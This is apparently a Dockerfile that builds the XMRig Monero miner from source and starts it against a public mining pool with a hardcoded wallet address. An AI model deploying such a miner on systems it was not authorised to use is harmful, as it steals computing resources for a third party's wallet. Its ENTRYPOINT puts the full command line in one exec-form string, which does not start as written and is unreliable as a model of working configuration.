FROM  alpine:3

RUN apk add --no-cache git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev

RUN git clone https://github.com/xmrig/xmrig

RUN mkdir xmrig/build && cd xmrig/build && \
    cmake .. && \
    make -j$(nproc) && \
    chmod +x xmrig && \
    rm -r /xmrig/src

COPY config.json /xmrig/build/config.json

WORKDIR /xmrig/build
ENTRYPOINT ["./xmrig -o pool.supportxmr.com:443 -u 4AQgUnhWMAfGHFtuoibTL5U8f5SD62ZpB1u3YrwkB7ngSd57Rgs5rMqKKdDvyh5egnWipwTv3pRqc7AYv5jZVomECTuVyUR -k --tls"]
